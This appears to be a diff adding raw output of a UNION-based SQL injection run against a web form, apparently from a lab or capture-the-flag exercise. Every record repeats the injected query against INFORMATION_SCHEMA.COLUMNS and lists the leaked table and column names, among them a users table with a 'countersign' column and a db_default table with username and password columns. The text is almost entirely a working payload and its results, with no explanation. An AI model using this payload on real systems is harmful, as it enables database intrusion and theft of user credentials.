+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE_LRU
+Surname : DATA_SIZE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE_LRU
+Surname : COMPRESSED_SIZE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE_LRU
+Surname : COMPRESSED
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE_LRU
+Surname : IO_FIX
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE_LRU
+Surname : IS_OLD
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE_LRU
+Surname : FREE_PAGE_CLOCK
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_STATS
+Surname : POOL_ID
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_STATS
+Surname : POOL_SIZE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_STATS
+Surname : FREE_BUFFERS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_STATS
+Surname : DATABASE_PAGES
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_STATS
+Surname : OLD_DATABASE_PAGES
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_STATS
+Surname : MODIFIED_DATABASE_PAGES
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_STATS
+Surname : PENDING_DECOMPRESS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_STATS
+Surname : PENDING_READS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_STATS
+Surname : PENDING_FLUSH_LRU
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_STATS
+Surname : PENDING_FLUSH_LIST
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_STATS
+Surname : PAGES_MADE_YOUNG
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_STATS
+Surname : PAGES_NOT_MADE_YOUNG
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_STATS
+Surname : PAGES_MADE_YOUNG_RATE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_STATS
+Surname : PAGES_MADE_NOT_YOUNG_RATE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_STATS
+Surname : NUMBER_PAGES_READ
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_STATS
+Surname : NUMBER_PAGES_CREATED
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_STATS
+Surname : NUMBER_PAGES_WRITTEN
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_STATS
+Surname : PAGES_READ_RATE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_STATS
+Surname : PAGES_CREATE_RATE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_STATS
+Surname : PAGES_WRITTEN_RATE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_STATS
+Surname : NUMBER_PAGES_GET
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_STATS
+Surname : HIT_RATE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_STATS
+Surname : YOUNG_MAKE_PER_THOUSAND_GETS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_STATS
+Surname : NOT_YOUNG_MAKE_PER_THOUSAND_GETS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_STATS
+Surname : NUMBER_PAGES_READ_AHEAD
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_STATS
+Surname : NUMBER_READ_AHEAD_EVICTED
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_STATS
+Surname : READ_AHEAD_RATE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_STATS
+Surname : READ_AHEAD_EVICTED_RATE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_STATS
+Surname : LRU_IO_TOTAL
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_STATS
+Surname : LRU_IO_CURRENT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_STATS
+Surname : UNCOMPRESS_TOTAL
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_STATS
+Surname : UNCOMPRESS_CURRENT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE
+Surname : POOL_ID
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE
+Surname : BLOCK_ID
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE
+Surname : SPACE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE
+Surname : PAGE_NUMBER
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE
+Surname : PAGE_TYPE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE
+Surname : FLUSH_TYPE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE
+Surname : FIX_COUNT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE
+Surname : IS_HASHED
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE
+Surname : NEWEST_MODIFICATION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE
+Surname : OLDEST_MODIFICATION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE
+Surname : ACCESS_TIME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE
+Surname : TABLE_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE
+Surname : INDEX_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE
+Surname : NUMBER_RECORDS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE
+Surname : DATA_SIZE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE
+Surname : COMPRESSED_SIZE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE
+Surname : PAGE_STATE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE
+Surname : IO_FIX
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE
+Surname : IS_OLD
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE
+Surname : FREE_PAGE_CLOCK
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_FOREIGN
+Surname : ID
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_FOREIGN
+Surname : FOR_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_FOREIGN
+Surname : REF_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_FOREIGN
+Surname : N_COLS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_FOREIGN
+Surname : TYPE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: db_default
+Surname : id
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: db_default
+Surname : username
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: db_default
+Surname : password
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: users
+Surname : user_id
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: users
+Surname : first_name
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: users
+Surname : last_name
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: users
+Surname : town
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: users
+Surname : country
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: users
+Surname : planet
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: users
+Surname : Commentaire
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: users
+Surname : countersign
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: guestbook
+Surname : id_comment
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: guestbook
+Surname : comment
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: guestbook
+Surname : name
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: list_images
+Surname : id
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: list_images
+Surname : url
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: list_images
+Surname : title
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: list_images
+Surname : comment
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: vote_dbs
+Surname : id_vote
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: vote_dbs
+Surname : vote
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: vote_dbs
+Surname : nb_vote
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: vote_dbs
+Surname : subject
+
+
